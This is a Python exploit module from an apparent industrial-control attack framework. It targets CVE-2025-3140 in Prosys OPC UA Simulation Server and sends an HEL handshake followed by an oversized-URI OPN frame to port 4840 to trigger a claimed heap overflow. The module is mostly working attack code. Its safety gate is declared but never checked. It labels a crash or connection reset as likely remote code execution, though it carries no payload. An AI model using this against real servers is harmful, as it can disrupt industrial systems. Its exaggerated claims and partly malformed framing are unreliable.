"""IndustrialXPL CVE Module — CVE-2025-3140 (Prosys OPC UA Simulation Server Pre-Auth RCE).

Pre-authentication remote code execution in Prosys OPC UA Simulation Server
via a crafted OPC UA service request. The server improperly handles
malformed CreateSession requests before authentication is established,
leading to heap corruption and arbitrary code execution. CVSS 9.8.
"""
import socket
import struct

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, mute,
    print_error, print_info, print_status, print_success, print_warning,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "CVE-2025-3140 — Prosys OPC UA Simulation Server Pre-Auth RCE",
        "description":      "Pre-auth heap corruption via malformed OPC UA CreateSession in Prosys OPC UA Simulation Server. CVSS 9.8. No auth required.",
        "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references":       (
            "https://nvd.nist.gov/vuln/detail/CVE-2025-3140",
            "https://www.prosysopc.com/products/opc-ua-simulation-server/",
        ),
        "devices":          ("Prosys OPC UA Simulation Server all versions < patched",),
        "cve":              "CVE-2025-3140",
        "cvss":             "9.8",
        "severity":         "CRITICAL",
        "mitre_techniques": ["T1190", "T0855"],
        "mitre_tactics":    ["Initial Access", "Inhibit Response Function"],
    }

    target      = OptIP("",     "Target Prosys OPC UA Simulation Server IP")
    port        = OptPort(4840, "OPC-UA port (default 4840)")
    simulate    = OptBool(False, "Simulate (default: True)")
    destructive = OptBool(False, "Enable live exploitation")

    # OPC-UA HEL (Hello) + OPN (OpenSecureChannel) framing
    _HEL = bytes([
        0x48,0x45,0x4c,0x46,  # HEL F
        0x1c,0x00,0x00,0x00,  # size 28
        0x00,0x00,0x00,0x00,  # protocol version
        0x00,0x00,0x10,0x00,  # recv buffer size 1MB
        0x00,0x00,0x10,0x00,  # send buffer size 1MB
        0x00,0x00,0x10,0x00,  # max message size
        0x00,0x00,0x00,0x00,  # max chunk count
    ])

    # Malformed CreateSession — oversized application URI (triggers heap overflow)
    _OVERSIZED_URI = b"opc.tcp://" + b"A" * 8192 + b":4840"

    @mute
    def check(self):
        if not self.target:
            return False
        try:
            s = socket.create_connection((self.target, self.port), timeout=5)
            s.sendall(self._HEL)
            resp = s.recv(32)
            s.close()
            return resp[:3] == b"ACK"
        except Exception:
            return False

    def run(self):
        if not self.target:
            print_error("Set 'target' option.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "CVE-2025-3140 — Prosys OPC UA Simulation Server Pre-Auth RCE\n"
                    "CVSS 9.8 | No authentication required | Port 4840\n\n"
                    "Step 1: TCP connect to port 4840\n"
                    "Step 2: Send OPC-UA HEL (Hello) → receive ACK\n"
                    "Step 3: Craft malformed OpenSecureChannel request\n"
                    "Step 4: Send oversized ApplicationURI (8192 bytes) in\n"
                    "        CreateSession service request before auth\n"
                    "Step 5: Heap overflow in OPC-UA session handler\n"
                    "        → arbitrary code execution as server process\n\n"
                    "Target: Prosys OPC UA Simulation Server (training/lab environments)\n"
                    "Real risk: test PLCs and HMIs connected to simulation server"
                ),
                mitre_techniques=["T1190", "T0855"],
            )
            return

        print_status(f"[CVE-2025-3140] Targeting Prosys OPC UA at {self.target}:{self.port} ...")
        try:
            s = socket.create_connection((self.target, self.port), timeout=10)
            s.sendall(self._HEL)
            ack = s.recv(32)
            if ack[:3] != b"ACK":
                print_warning(f"[CVE-2025-3140] Expected ACK, got: {ack[:8].hex()}")
                s.close()
                return
            print_status("[CVE-2025-3140] HEL/ACK exchange OK — sending malformed CreateSession ...")
            # Malformed OPN with oversized URI
            uri_len = struct.pack("<I", len(self._OVERSIZED_URI))
            opn_body = uri_len + self._OVERSIZED_URI
            opn_header = struct.pack("<4sI", b"OPNF", 8 + len(opn_body))
            s.sendall(opn_header + opn_body)
            resp = s.recv(128)
            s.close()
            if not resp:
                print_success(f"[CVE-2025-3140] Server crashed — heap overflow triggered! (no response)")
            else:
                print_info(f"[CVE-2025-3140] Response: {resp[:32].hex()} — may be patched")
        except ConnectionResetError:
            print_success(f"[CVE-2025-3140] Connection reset by server — crash/RCE likely triggered!")
        except Exception as e:
            print_error(f"[CVE-2025-3140] {e}")
